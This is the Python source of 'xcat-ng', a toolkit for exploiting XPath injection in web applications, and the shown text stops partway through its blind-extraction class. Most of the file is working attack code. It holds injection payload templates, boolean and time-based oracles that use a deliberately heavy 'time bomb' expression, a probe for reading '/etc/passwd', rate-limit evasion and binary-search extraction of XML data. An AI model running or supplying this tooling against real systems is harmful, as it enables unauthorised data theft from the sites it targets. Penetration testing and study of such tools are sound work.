#!/usr/bin/env python3
"""
xcat-ng — Modern XPath Injection Exploitation Toolkit (rewrite)

Dependencies:
    pip install httpx rich prompt_toolkit aiohttp
"""

from __future__ import annotations

# ── stdlib ────────────────────────────────────────────────────────────────────
import asyncio
import argparse
import contextlib
import difflib
import enum
import hashlib
import inspect
import json
import math
import os
import random
import re
import shlex
import signal
import statistics
import string
import sys
import time as _time
from collections import Counter, defaultdict, deque
from dataclasses import dataclass, field
from pathlib import Path
from typing import (
    Any, Callable, Dict, FrozenSet, List, Optional, Sequence, Tuple, Union
)
from urllib.parse import parse_qs, urlencode, urlparse, unquote, quote
from xml.sax.saxutils import escape

# ── third-party ───────────────────────────────────────────────────────────────
try:
    import httpx
except ImportError:
    sys.exit("[!] Missing dependency: pip install httpx")

try:
    from rich.console import Console
    from rich.progress import (
        Progress, SpinnerColumn, BarColumn, TextColumn,
        TimeElapsedColumn, MofNCompleteColumn, TaskProgressColumn,
    )
    from rich.table import Table
    from rich.panel import Panel
    from rich.syntax import Syntax
    from rich.tree import Tree
    from rich import box
except ImportError:
    sys.exit("[!] Missing dependency: pip install rich")

try:
    from prompt_toolkit import PromptSession
    from prompt_toolkit.history import FileHistory
    from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
    from prompt_toolkit.completion import WordCompleter
    HAS_PROMPT_TOOLKIT = True
except ImportError:
    HAS_PROMPT_TOOLKIT = False

try:
    from aiohttp import web as aio_web
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False


# ═══════════════════════════════════════════════════════════════════════════════
# Constants & Enums
# ═══════════════════════════════════════════════════════════════════════════════

VERSION = "2.0.0"

DEFAULT_TIMEOUT = 15.0
DEFAULT_CONCURRENCY = 10
DEFAULT_DELAY = 0.0
MAX_RETRIES = 3

ASCII_SEARCH_SPACE = string.digits + string.ascii_letters + "+./:@_ -,()!;='\"\\<>{}[]|~`#$%^&*?\n\r\t"
MISSING_CHAR = "?"

# Time-bomb: a heavy XPath expression that causes measurable delay
TIME_BOMB = "count((//.)[count((//.)[count((//.))>0])>0])"

console = Console(highlight=False)


class Technique(str, enum.Enum):
    AUTO    = "auto"
    BOOLEAN = "boolean"
    TIME    = "time"
    NORMAL  = "normal"


class Mode(str, enum.Enum):
    SAFE       = "safe"
    AGGRESSIVE = "aggressive"


# ═══════════════════════════════════════════════════════════════════════════════
# Banner
# ═══════════════════════════════════════════════════════════════════════════════

BANNER = r"""[bold cyan]
 ██╗  ██╗ ██████╗ █████╗ ████████╗    ███╗   ██╗ ██████╗
 ╚██╗██╔╝██╔════╝██╔══██╗╚══██╔══╝    ████╗  ██║██╔════╝
  ╚███╔╝ ██║     ███████║   ██║       ██╔██╗ ██║██║  ███╗
  ██╔██╗ ██║     ██╔══██║   ██║       ██║╚██╗██║██║   ██║
 ██╔╝ ██╗╚██████╗██║  ██║   ██║       ██║ ╚████║╚██████╔╝
 ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝       ╚═╝  ╚═══╝ ╚═════╝[/bold cyan]
[dim]  Modern XPath Injection Toolkit  v{ver}[/dim]
""".replace("{ver}", VERSION)


# ═══════════════════════════════════════════════════════════════════════════════
# Data Models
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass(slots=True)
class ParsedRequest:
    """Represents a parsed HTTP request (from Burp or manual args)."""
    method: str
    url: str
    headers: dict[str, str]
    query_params: dict[str, str]
    body_params: dict[str, str]
    raw_body: Optional[str] = None
    body_content_type: str = "application/x-www-form-urlencoded"

    @property
    def all_params(self) -> dict[str, str]:
        return {**self.query_params, **self.body_params}


@dataclass(slots=True)
class EngineConfig:
    timeout: float = DEFAULT_TIMEOUT
    delay: float = DEFAULT_DELAY
    concurrency: int = DEFAULT_CONCURRENCY
    proxy: Optional[str] = None
    verify_ssl: bool = False
    mode: Mode = Mode.SAFE


@dataclass(slots=True)
class ResponseProfile:
    length: int
    hash: str
    entropy: float
    status: int = 200


@dataclass(slots=True)
class XmlNode:
    name: str
    value: Optional[str] = None
    attributes: dict[str, str] = field(default_factory=dict)
    children: list["XmlNode"] = field(default_factory=list)
    comments: list[str] = field(default_factory=list)

    def to_xml(self, indent: int = 0) -> str:
        pad = "  " * indent
        attrs = "".join(f' {k}="{escape(v)}"' for k, v in self.attributes.items())
        parts: list[str] = []

        if self.children:
            parts.append(f"{pad}<{self.name}{attrs}>")
            for comment in self.comments:
                parts.append(f"{pad}  <!--{escape(comment)}-->")
            if self.value:
                parts.append(f"{pad}  {escape(self.value)}")
            for child in self.children:
                parts.append(child.to_xml(indent + 1))
            parts.append(f"{pad}</{self.name}>")
        else:
            text = escape(self.value) if self.value else ""
            if self.comments:
                parts.append(f"{pad}<{self.name}{attrs}>")
                for comment in self.comments:
                    parts.append(f"{pad}  <!--{escape(comment)}-->")
                if text:
                    parts.append(f"{pad}  {text}")
                parts.append(f"{pad}</{self.name}>")
            else:
                if text:
                    parts.append(f"{pad}<{self.name}{attrs}>{text}</{self.name}>")
                else:
                    parts.append(f"{pad}<{self.name}{attrs}/>")
        return "\n".join(parts)


@dataclass(slots=True)
class ExtractionState:
    """Persistent state for resume support."""
    phase: str = "idle"
    partial: dict[str, str] = field(default_factory=dict)

    def save(self, path: str):
        with open(path, "w") as f:
            json.dump({"phase": self.phase, "partial": self.partial}, f, indent=2)

    @staticmethod
    def load(path: str) -> "ExtractionState":
        with open(path) as f:
            d = json.load(f)
        return ExtractionState(phase=d.get("phase", "idle"), partial=d.get("partial", {}))


# ═══════════════════════════════════════════════════════════════════════════════
# Utility Helpers
# ═══════════════════════════════════════════════════════════════════════════════

def calculate_entropy(text: str) -> float:
    if not text:
        return 0.0
    freq: dict[str, int] = {}
    for c in text:
        freq[c] = freq.get(c, 0) + 1
    length = len(text)
    return -sum((cnt / length) * math.log2(cnt / length) for cnt in freq.values())


def build_profile(text: str, status: int = 200) -> ResponseProfile:
    return ResponseProfile(
        length=len(text),
        hash=hashlib.sha256(text.encode(errors="replace")).hexdigest(),
        entropy=calculate_entropy(text),
        status=status,
    )


def similarity(a: str, b: str) -> float:
    return difflib.SequenceMatcher(None, a, b).ratio()


def strip_html(html: str) -> str:
    text = re.sub(r"<[^>]+>", " ", html)
    return re.sub(r"\s+", " ", text).strip()


class Confidence:
    """Tracks oracle reliability."""
    __slots__ = ("success", "fail")

    def __init__(self):
        self.success = 0
        self.fail = 0

    def record(self, result: bool):
        if result:
            self.success += 1
        else:
            self.fail += 1

    @property
    def score(self) -> float:
        total = self.success + self.fail
        return self.success / total if total else 0.0


# ═══════════════════════════════════════════════════════════════════════════════
# Burp Request Parser
# ═══════════════════════════════════════════════════════════════════════════════

def parse_burp_request(path: str, force_https: bool = False) -> ParsedRequest:
    """Parse a raw HTTP request exported from Burp Suite."""
    raw = Path(path).read_text(errors="replace")
    lines = raw.splitlines()
    if not lines:
        raise ValueError("Empty request file")

    m = re.match(r"^(GET|POST|PUT|PATCH|DELETE|OPTIONS|HEAD)\s+(\S+)\s+HTTP/", lines[0], re.I)
    if not m:
        raise ValueError(f"Invalid request line: {lines[0]!r}")

    method = m.group(1).upper()
    path_qs = m.group(2)

    headers: dict[str, str] = {}
    host = ""
    content_type = "application/x-www-form-urlencoded"

    i = 1
    while i < len(lines) and lines[i].strip():
        if ":" in lines[i]:
            k, _, v = lines[i].partition(":")
            key_lower = k.strip().lower()
            headers[k.strip()] = v.strip()
            if key_lower == "host":
                host = v.strip()
            elif key_lower == "content-type":
                content_type = v.strip()
        i += 1

    raw_body = "\n".join(lines[i + 1:]).strip() if i + 1 < len(lines) else ""

    # Determine scheme
    if force_https or "443" in host.split(":")[-1:]:
        scheme = "https"
    else:
        scheme = "http"

    full_url = f"{scheme}://{host}{path_qs}"
    parsed = urlparse(full_url)

    query_params = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}

    body_params: dict[str, str] = {}
    if raw_body:
        if "application/x-www-form-urlencoded" in content_type:
            body_params = {k: v[0] for k, v in parse_qs(raw_body, keep_blank_values=True).items()}
        elif "application/json" in content_type:
            try:
                jdata = json.loads(raw_body)
                if isinstance(jdata, dict):
                    body_params = {k: str(v) for k, v in jdata.items()}
            except json.JSONDecodeError:
                pass
        elif "text/xml" in content_type or "application/xml" in content_type:
            # Store raw body for XML; attempt simple key-value extraction
            for m_xml in re.finditer(r"<(\w+)>([^<]+)</\1>", raw_body):
                body_params[m_xml.group(1)] = m_xml.group(2)

    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    return ParsedRequest(
        method=method,
        url=base_url,
        headers=headers,
        query_params=query_params,
        body_params=body_params,
        raw_body=raw_body or None,
        body_content_type=content_type,
    )


def build_manual_request(
    url: str,
    method: str = "GET",
    data: Optional[str] = None,
    headers: Optional[list[str]] = None,
    json_body: Optional[str] = None,
) -> ParsedRequest:
    """Build ParsedRequest from CLI arguments."""
    parsed = urlparse(url)
    query_params = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}

    body_params: dict[str, str] = {}
    raw_body = None
    content_type = "application/x-www-form-urlencoded"

    if json_body:
        raw_body = json_body
        content_type = "application/json"
        try:
            jdata = json.loads(json_body)
            if isinstance(jdata, dict):
                body_params = {k: str(v) for k, v in jdata.items()}
        except json.JSONDecodeError:
            pass
    elif data:
        raw_body = data
        body_params = {k: v[0] for k, v in parse_qs(data, keep_blank_values=True).items()}

    header_dict: dict[str, str] = {}
    if headers:
        for h in headers:
            if ":" not in h:
                raise ValueError(f"Invalid header: {h}")
            k, v = h.split(":", 1)
            header_dict[k.strip()] = v.strip()

    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    return ParsedRequest(
        method=method.upper(),
        url=base_url,
        headers=header_dict,
        query_params=query_params,
        body_params=body_params,
        raw_body=raw_body,
        body_content_type=content_type,
    )


# ═══════════════════════════════════════════════════════════════════════════════
# Async HTTP Engine
# ═══════════════════════════════════════════════════════════════════════════════

class HTTPEngine:
    """Async HTTP engine with cache-busting, rate-limit handling, and delay."""

    def __init__(self, request: ParsedRequest, config: EngineConfig):
        self.request = request
        self.config = config
        self.request_count = 0
        self._client: Optional[httpx.AsyncClient] = None

    async def _get_client(self) -> httpx.AsyncClient:
        if self._client is None or self._client.is_closed:
            kwargs: dict[str, Any] = {
                "timeout": httpx.Timeout(self.config.timeout),
                "verify": self.config.verify_ssl,
                "follow_redirects": True,
            }

            # httpx >= 0.28 uses 'proxy' (singular); older uses 'proxies' (dict)
            if self.config.proxy:
                init_params = inspect.signature(httpx.AsyncClient.__init__).parameters
                if "proxy" in init_params:
                    kwargs["proxy"] = self.config.proxy
                elif "proxies" in init_params:
                    kwargs["proxies"] = self.config.proxy
                else:
                    # Fallback: set on transport
                    kwargs["transport"] = httpx.AsyncHTTPTransport(
                        retries=2, proxy=self.config.proxy
                    )

            if "transport" not in kwargs:
                kwargs["transport"] = httpx.AsyncHTTPTransport(retries=2)

            self._client = httpx.AsyncClient(**kwargs)
        return self._client

    async def close(self):
        if self._client and not self._client.is_closed:
            await self._client.aclose()

    async def send(
        self,
        overrides: Optional[dict[str, str]] = None,
        extra_params: Optional[dict[str, str]] = None,
    ) -> Tuple[str, float, int]:
        """
        Send request with optional parameter overrides.
        Returns (response_text, elapsed_seconds, status_code).
        """
        client = await self._get_client()
        overrides = overrides or {}
        extra_params = extra_params or {}

        params = {**self.request.query_params}
        body = {**self.request.body_params}

        for k, v in overrides.items():
            if k in params:
                params[k] = v
            elif k in body:
                body[k] = v
            else:
                # If param location unknown, put in whichever dict has entries,
                # or default to query for GET, body for POST
                if self.request.method == "GET":
                    params[k] = v
                else:
                    body[k] = v

        params.update(extra_params)

        # Cache-busting
        params["_xcng"] = str(random.randint(100000, 999999))

        headers = {**self.request.headers}
        # Remove content-length as httpx recalculates
        headers.pop("Content-Length", None)
        headers.pop("content-length", None)

        try:
            if self.request.method == "GET":
                resp = await client.get(self.request.url, params=params, headers=headers)
            else:
                send_data: Any
                if "application/json" in self.request.body_content_type and body:
                    send_data = None
                    resp = await client.request(
                        self.request.method,
                        self.request.url,
                        params=params,
                        json={k: v for k, v in body.items()},
                        headers=headers,
                    )
                else:
                    resp = await client.request(
                        self.request.method,
                        self.request.url,
                        params=params,
                        data=body if body else self.request.raw_body,
                        headers=headers,
                    )

            self.request_count += 1

            # Anti rate-limit
            if resp.status_code == 429:
                retry_after = float(resp.headers.get("Retry-After", "3"))
                await asyncio.sleep(retry_after)
                return await self.send(overrides, extra_params)

            if self.config.delay > 0:
                await asyncio.sleep(self.config.delay)

            return resp.text, resp.elapsed.total_seconds(), resp.status_code

        except (httpx.RequestError, httpx.HTTPStatusError) as exc:
            return "", 0.0, 0


# ═══════════════════════════════════════════════════════════════════════════════
# Injection Templates
# ═══════════════════════════════════════════════════════════════════════════════

# Each tuple: (name, example_context, [(true_test, false_test)], payload_template)
# In payload_template: {W} = working value, {E} = XPath expression to evaluate

INJECTION_TEMPLATES: list[tuple[str, str, list[tuple[str, str]], str]] = [
    (
        "integer",
        "/node[id=?]",
        [("{W} and 1=1", "{W} and 1=2")],
        "{W} and {E}",
    ),
    (
        "string (single-quote)",
        "/node[name='?']",
        [("{W}' and '1'='1", "{W}' and '1'='2")],
        "{W}' and {E} and '1'='1",
    ),
    (
        "string (double-quote)",
        '/node[name="?"]',
        [("{W}\" and \"1\"=\"1", "{W}\" and \"1\"=\"2")],
        "{W}\" and {E} and \"1\"=\"1",
    ),
    (
        "string (single-quote paren)",
        "/node[fn('?')]",
        [("{W}') and true() and ('1'='1", "{W}') and false() and ('1'='1")],
        "{W}') and {E} and ('1'='1",
    ),
    (
        "string (double-quote paren)",
        '/node[fn("?")]',
        [("{W}\") and true() and (\"1\"=\"1", "{W}\") and false() and (\"1\"=\"1")],
        "{W}\") and {E} and (\"1\"=\"1",
    ),
    (
        "attribute name prefix",
        "/node[?=value]",
        [("1=1 and {W}", "1=2 and {W}")],
        "{E} and {W}",
    ),
    (
        "attribute name postfix",
        "/node[?=value]",
        [("{W} and not 1=2 and {W}", "{W} and 1=2 and {W}")],
        "{W} and {E} and {W}",
    ),
    (
        "element name prefix",
        "/lib/something?/",
        [(".[true()]/{W}", ".[false()]/{W}")],
        ".[{E}]/{W}",
    ),
    (
        "element name postfix",
        "/lib/?something",
        [("{W}[true()]", "{W}[false()]")],
        "{W}[{E}]",
    ),
    (
        "union break (single-quote)",
        "/node[fn('?') and false()] | //*[?]",
        [
            ("{W}') and false()] | //*[true() and ('1'='1",
             "{W}') and false()] | //*[false() and ('1'='1"),
        ],
        "{W}') and false()] | //*[{E} and ('1'='1",
    ),
]


@dataclass(slots=True)
class Injection:
    """Represents a detected injection type."""
    name: str
    example: str
    payload_template: str
    param: str
    working_value: str

    def make_payload(self, expression: str) -> str:
        return self.payload_template.replace("{W}", self.working_value).replace("{E}", expression)


# ═══════════════════════════════════════════════════════════════════════════════
# Feature Detection (XPath 1.0/2.0/3.0 capabilities)
# ═══════════════════════════════════════════════════════════════════════════════

FEATURES: list[tuple[str, list[str]]] = [
    ("xpath-2", [
        "lower-case('A')='a'",
        "ends-with('thetest','test')",
        "encode-for-uri('test')='test'",
    ]),
    ("xpath-3", [
        "boolean(generate-id(/))",
    ]),
    ("normalize-space", [
        "normalize-space('  a  b ')='a b'",
    ]),
    ("substring-search", [
        f"string-length(substring-before('{ASCII_SEARCH_SPACE[:70]}','h'))={ASCII_SEARCH_SPACE[:70].find('h')}",
    ]),
    ("codepoint-search", [
        "string-to-codepoints('test')[1]=116",
    ]),
    ("environment-variables", [
        "exists(available-environment-variables())",
    ]),
    ("document-uri", [
        "document-uri(/)",
    ]),
    ("base-uri", [
        "base-uri()",
    ]),
    ("current-datetime", [
        "string(current-dateTime())",
    ]),
    ("unparsed-text", [
        "unparsed-text-available(document-uri(/))",
    ]),
    ("doc-function", [
        "doc-available(document-uri(/))",
    ]),
    ("linux", [
        "unparsed-text-available('/etc/passwd')",
    ]),
]


async def detect_features(oracle: "BaseOracle") -> dict[str, bool]:
    """Detect which XPath features are available through the oracle."""
    detected: dict[str, bool] = {}
    for feat_name, tests in FEATURES:
        results = []
        for test_expr in tests:
            try:
                r = await oracle.ask(test_expr)
                results.append(r)
            except Exception:
                results.append(False)
        detected[feat_name] = all(results)
    return detected


# ═══════════════════════════════════════════════════════════════════════════════
# Oracle Abstraction (Boolean & Time-based)
# ═══════════════════════════════════════════════════════════════════════════════

class BaseOracle:
    """Abstract boolean oracle — asks yes/no questions via XPath injection."""

    def __init__(self, engine: HTTPEngine, injection: Injection):
        self.engine = engine
        self.injection = injection
        self.confidence = Confidence()

    async def ask(self, condition: str) -> bool:
        raise NotImplementedError


class BooleanOracle(BaseOracle):
    """
    Boolean-based oracle: interprets response similarity to baseline
    as true/false.
    """

    def __init__(
        self,
        engine: HTTPEngine,
        injection: Injection,
        match_fn: Optional[Callable[[int, str], bool]] = None,
        baseline_html: str = "",
        true_sim_threshold: float = 0.85,
        mode: Mode = Mode.SAFE,
    ):
        super().__init__(engine, injection)
        self.match_fn = match_fn
        self.baseline_html = baseline_html
        self.true_sim_threshold = true_sim_threshold
        self.mode = mode

    async def ask(self, condition: str) -> bool:
        payload = self.injection.make_payload(condition)
        attempts = 1 if self.mode == Mode.AGGRESSIVE else MAX_RETRIES

        if self.match_fn:
            # User provided explicit match function
            votes = 0
            for _ in range(attempts):
                html, _, status = await self.engine.send({self.injection.param: payload})
                if self.match_fn(status, html):
                    votes += 1
            result = votes > attempts // 2
            self.confidence.record(result)
            return result

        # Auto-similarity mode
        votes = 0
        for _ in range(attempts):
            html, _, _ = await self.engine.send({self.injection.param: payload})
            sim = similarity(self.baseline_html, html)
            if sim > self.true_sim_threshold:
                votes += 1
        result = votes > attempts // 2
        self.confidence.record(result)
        return result


class TimeOracle(BaseOracle):
    """Time-based oracle: true condition triggers a heavy XPath computation."""

    def __init__(
        self,
        engine: HTTPEngine,
        injection: Injection,
        threshold: float,
        mode: Mode = Mode.SAFE,
    ):
        super().__init__(engine, injection)
        self.threshold = threshold
        self.mode = mode

    async def ask(self, condition: str) -> bool:
        # Wrap condition: if true, evaluate TIME_BOMB; otherwise fast
        wrapped = f"({condition}) and {TIME_BOMB}>0"
        payload = self.injection.make_payload(wrapped)
        attempts = 1 if self.mode == Mode.AGGRESSIVE else MAX_RETRIES

        times: list[float] = []
        for _ in range(attempts):
            _, t, _ = await self.engine.send({self.injection.param: payload})
            times.append(t)

        mean_t = statistics.mean(times)
        result = mean_t > self.threshold
        self.confidence.record(result)
        return result


# ═══════════════════════════════════════════════════════════════════════════════
# Match Function Builder (for explicit true-string / true-code)
# ═══════════════════════════════════════════════════════════════════════════════

def make_match_function(
    true_code: Optional[str] = None,
    true_string: Optional[str] = None,
) -> Optional[Callable[[int, str], bool]]:
    """
    Build a match function from CLI flags.
    Supports negation with '!' prefix.
    Returns None if neither is given (auto-similarity will be used).
    """
    if not true_code and not true_string:
        return None

    negate_code = False
    expected_code: Optional[int] = None
    if true_code:
        if true_code.startswith("!"):
            negate_code = True
            true_code = true_code[1:]
        expected_code = int(true_code)

    negate_string = False
    expected_string: Optional[str] = None
    if true_string:
        if true_string.startswith("!"):
            negate_string = True
            true_string = true_string[1:]
        expected_string = true_string

    def matcher(status: int, body: str) -> bool:
        code_ok = True
        if expected_code is not None:
            code_ok = (status != expected_code) if negate_code else (status == expected_code)
        str_ok = True
        if expected_string is not None:
            str_ok = (expected_string not in body) if negate_string else (expected_string in body)
        return code_ok and str_ok

    return matcher


# ═══════════════════════════════════════════════════════════════════════════════
# Parameter Ranking & Injection Detection
# ═══════════════════════════════════════════════════════════════════════════════

def rank_parameters(params: dict[str, str]) -> list[str]:
    """Rank parameters by likelihood of being injectable."""
    return sorted(
        params.keys(),
        key=lambda k: (
            params[k].isdigit(),       # non-numeric first (more likely strings)
            -len(params[k]),           # longer values first
            k.lower(),
        ),
    )


async def detect_injection_type(
    engine: HTTPEngine,
    param: str,
    working_value: str,
    match_fn: Optional[Callable] = None,
) -> Optional[Injection]:
    """
    Try all injection templates against a single parameter.
    Returns the first matching Injection or None.
    """
    # Get baseline
    baseline_html, _, baseline_status = await engine.send({})

    for name, example, test_pairs, payload_tpl in INJECTION_TEMPLATES:
        all_ok = True
        for true_tpl, false_tpl in test_pairs:
            true_payload = true_tpl.replace("{W}", working_value)
            false_payload = false_tpl.replace("{W}", working_value)

            true_html, _, true_status = await engine.send({param: true_payload})
            false_html, _, false_status = await engine.send({param: false_payload})

            if match_fn:
                true_match = match_fn(true_status, true_html)
                false_match = match_fn(false_status, false_html)
                if not (true_match and not false_match):
                    all_ok = False
                    break
            else:
                # Auto-detect: true should be similar to baseline, false should differ
                sim_true = similarity(baseline_html, true_html)
                sim_false = similarity(baseline_html, false_html)
                true_profile = build_profile(true_html)
                false_profile = build_profile(false_html)

                metrics = 0
                if sim_true > sim_false + 0.05:
                    metrics += 1
                if abs(true_profile.length - false_profile.length) > 10:
                    metrics += 1
                if abs(true_profile.entropy - false_profile.entropy) > 0.02:
                    metrics += 1
                if true_profile.hash != false_profile.hash:
                    metrics += 1

                if metrics < 3:
                    all_ok = False
                    break

        if all_ok:
            return Injection(
                name=name,
                example=example,
                payload_template=payload_tpl,
                param=param,
                working_value=working_value,
            )

    return None


async def detect_time_injection(
    engine: HTTPEngine,
    param: str,
    working_value: str,
) -> Optional[Tuple[Injection, float]]:
    """Detect time-based injection on a parameter."""
    samples = 5

    for name, example, test_pairs, payload_tpl in INJECTION_TEMPLATES:
        for true_tpl, false_tpl in test_pairs:
            bomb_payload = true_tpl.replace("{W}", working_value)
            bomb_payload = bomb_payload.replace("1=1", f"1=1 and {TIME_BOMB}>0")

            false_payload = false_tpl.replace("{W}", working_value)

            true_times: list[float] = []
            false_times: list[float] = []

            for _ in range(samples):
                _, t, _ = await engine.send({param: bomb_payload})
                true_times.append(t)

            for _ in range(samples):
                _, t, _ = await engine.send({param: false_payload})
                false_times.append(t)

            mean_true = statistics.mean(true_times)
            mean_false = statistics.mean(false_times)
            std_false = statistics.stdev(false_times) if len(false_times) > 1 else 0.01
            if std_false == 0:
                std_false = 0.01

            z_score = (mean_true - mean_false) / std_false

            if z_score > 3 and mean_true > mean_false + 0.3:
                threshold = (mean_true + mean_false) / 2
                inj = Injection(
                    name=f"{name} (time-based)",
                    example=example,
                    payload_template=payload_tpl,
                    param=param,
                    working_value=working_value,
                )
                return inj, threshold

    return None


# ═══════════════════════════════════════════════════════════════════════════════
# Full Auto-Detection (scans all params, all techniques)
# ═══════════════════════════════════════════════════════════════════════════════

async def auto_detect(
    engine: HTTPEngine,
    params: dict[str, str],
    tech: Technique,
    match_fn: Optional[Callable] = None,
    target_param: Optional[str] = None,
    config: EngineConfig = EngineConfig(),
) -> Tuple[Optional[Technique], Optional[BaseOracle], Optional[dict]]:
    """
    Detect injectable parameter and technique.
    Returns (technique, oracle, extra_info_dict_or_None).
    """
    if target_param:
        param_list = [target_param]
    else:
        param_list = rank_parameters(params)

    # Try NORMAL (union-based) first if applicable
    if tech in (Technique.AUTO, Technique.NORMAL):
        result = await detect_normal_injection(engine, params)
        if result:
            return Technique.NORMAL, None, result

    for param in param_list:
        working_value = params.get(param, "")
        console.print(f"  [dim]Testing parameter:[/dim] [yellow]{param}[/yellow] = [dim]{working_value!r}[/dim]")

        # Boolean-based
        if tech in (Technique.AUTO, Technique.BOOLEAN):
            inj = await detect_injection_type(engine, param, working_value, match_fn)
            if inj:
                console.print(f"  [green]✓[/green] Boolean injection: [bold]{inj.name}[/bold] on [yellow]{param}[/yellow]")
                baseline_html, _, _ = await engine.send({})
                oracle = BooleanOracle(
                    engine, inj, match_fn,
                    baseline_html=baseline_html,
                    mode=config.mode,
                )
                return Technique.BOOLEAN, oracle, None

        # Time-based
        if tech in (Technique.AUTO, Technique.TIME):
            result = await detect_time_injection(engine, param, working_value)
            if result:
                inj, threshold = result
                console.print(f"  [green]✓[/green] Time injection: [bold]{inj.name}[/bold] on [yellow]{param}[/yellow] (threshold={threshold:.2f}s)")
                oracle = TimeOracle(engine, inj, threshold, mode=config.mode)
                return Technique.TIME, oracle, None

    return None, None, None


# ═══════════════════════════════════════════════════════════════════════════════
# Normal (Union-based) Injection
# ═══════════════════════════════════════════════════════════════════════════════

async def detect_normal_injection(
    engine: HTTPEngine,
    params: dict[str, str],
) -> Optional[dict]:
    """Detect normal/union-based injection where data leaks in response."""
    param_list = list(params.keys())
    null_payloads = [
        ("' and '1'='2", "'"),
        ("') and ('1'='2", "')"),
        ("\" and \"1\"=\"2", "\""),
    ]

    for inj_param in param_list:
        for null_payload, _ in null_payloads:
            null_html, _, _ = await engine.send({inj_param: null_payload})
            null_len = len(null_html)

            for node_param in param_list:
                if node_param == inj_param:
                    continue
                original = params[node_param]
                probe = f"{original} | /*[1]"
                html, _, _ = await engine.send({inj_param: null_payload, node_param: probe})

                if len(html) > null_len + 10:
                    return {
                        "inj_param": inj_param,
                        "node_param": node_param,
                        "null_payload": null_payload,
                    }
    return None


class NormalExtractor:
    """Extracts injected node values from HTML responses for union-based attacks."""

    def __init__(self):
        self.mode = "auto"
        self.regex_pattern: Optional[str] = None
        self.null_html = ""
        self.null_text = ""
        self.patterns = [
            r"<td[^>]*>(.*?)</td>",
            r"<span[^>]*>(.*?)</span>",
            r"<p[^>]*>(.*?)</p>",
            r"<div[^>]*>(.*?)</div>",
            r"<li[^>]*>(.*?)</li>",
        ]

    def calibrate(self, null_html: str, probe_html: str, known_value: str = ""):
        self.null_html = null_html
        self.null_text = strip_html(null_html)

        for pattern in self.patterns:
            match = re.search(pattern, probe_html, re.I | re.DOTALL)
            if match and (not known_value or known_value in match.group(1)):
                self.mode = "regex"
                self.regex_pattern = pattern
                return
        self.mode = "diff"

    def extract(self, html: str) -> Optional[str]:
        if not html:
            return None
        if self.mode == "regex" and self.regex_pattern:
            m = re.search(self.regex_pattern, html, re.I | re.DOTALL)
            if m:
                val = strip_html(m.group(1))
                return val if val else None
        # Diff fallback
        stripped = strip_html(html)
        words = stripped.split()
        base_words = set(self.null_text.split())
        diff = [w for w in words if w not in base_words]
        return " ".join(diff) if diff else None


async def normal_extract(
    engine: HTTPEngine,
    info: dict,
    max_depth: int = 8,
    max_siblings: int = 20,
) -> list[XmlNode]:
    """BFS traversal for normal/union-based extraction."""
    inj_param = info["inj_param"]
    node_param = info["node_param"]
    null_payload = info["null_payload"]

    extractor = NormalExtractor()
    null_html, _, _ = await engine.send({inj_param: null_payload})
    probe_html, _, _ = await engine.send({
        inj_param: null_payload,
        node_param: f"dummy | /*[1]",
    })
    extractor.calibrate(null_html, probe_html)

    results: list[tuple[str, str]] = []
    queue: deque[list[str]] = deque([["/*[1]"]])

    with Progress(
        SpinnerColumn(),
        TextColumn("[bold blue]{task.description}"),
        BarColumn(),
        MofNCompleteColumn(),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task = progress.add_task("Normal BFS traversal", total=None)

        while queue:
            path = queue.popleft()
            xpath = "".join(path)

            html, _, _ = await engine.send({
                inj_param: null_payload,
                node_param: f"dummy | {xpath}",
            })

            value = extractor.extract(html)

            # BFS pruning
            if not value and len(html) < len(null_html) + 5:
                progress.advance(task)
                continue

            if value:
                results.append((xpath, value))
                progress.console.print(f"  [green]→[/green] {xpath} = [cyan]{value}[/cyan]")

            if len(path) < max_depth:
                for i in range(1, max_siblings + 1):
                    queue.append(path + [f"/*[{i}]"])

            progress.advance(task)

    # Build simple tree
    nodes: list[XmlNode] = []
    for xpath, value in results:
        nodes.append(XmlNode(name=xpath, value=value))
    return nodes


# ═══════════════════════════════════════════════════════════════════════════════
# Blind Extraction Engine
# ═══════════════════════════════════════════════════════════════════════════════

class BlindExtractor:
    """
    Extracts strings/counts from XML via blind boolean/time oracle.
    Uses binary search for lengths and codepoints, adaptive charset,
    and concurrent character fetching.
    """

    def __init__(
        self,
        oracle: BaseOracle,
        features: dict[str, bool],
        concurrency: int = 10,
        max_len: int = 500,
        mode: Mode = Mode.SAFE,
    ):
        self.oracle = oracle
        self.features = features
        self.concurrency = concurrency * 2 if mode == Mode.AGGRESSIVE else concurrency
        self.max_len = max_len
        self.mode = mode
        self.charset = list(ASCII_SEARCH_SPACE)
        self.common_strings: Counter = Counter()
        self.common_chars: Counter = Counter()
        self._sem = asyncio.Semaphore(self.concurrency)

    # ── counting ──────────────────────────────────────────────────────────

    async def binary_search(self, expression: str, low: int = 0, high: int = 25) -> int:
        """Binary search for a numeric XPath value."""
        # First, check if value exceeds high
        while await self.oracle.ask(f"{expression}>{high}"):
            high *= 2
            if high > 100000:
                return -1

        while low <= high:
            mid = (low + high) // 2
            if await self.oracle.ask(f"{expression}>{mid}"):
                low = mid + 1
            elif await self.oracle.ask(f"{expression}<{mid}"):
                high = mid - 1
            else:
                return mid

        return low

    async def get_count(self, expression: str) -> int:
        return await self.binary_search(f"count({expression})")

    async def get_string_length(self, expression: str) -> int:
        return await self.binary_search(f"string-length({expression})")

    # ── character extraction ──────────────────────────────────────────────

    async def get_char_codepoint(self, expression: str) -> Optional[str]:
        """Extract character using XPath 2.0 string-to-codepoints (binary search)."""
        cp = await self.binary_search(f"string-to-codepoints({expression})", low=0, high=255)
        return chr(cp) if cp > 0 else None

    async def get_char_substring(self, expression: str) -> Optional[str]:
        """
        Extract character using substring-before on a known search space.
        O(log n) queries instead of O(n).
        """
        space = ASCII_SEARCH_SPACE[:70]  # Use a reasonable subset

        if await self.oracle.ask(f"{expression}='{space[0]}'"):
            return space[0]

        idx = await self.binary_search(
            f"string-length(substring-before('{space}',{expression}))",
            low=0,
            high=len(space),
        )
        if 0 < idx < len(space):
            return space[idx]
        return None

    async def get_char_bruteforce(self, expression: str) -> str:
        """Brute-force character extraction with adaptive charset."""
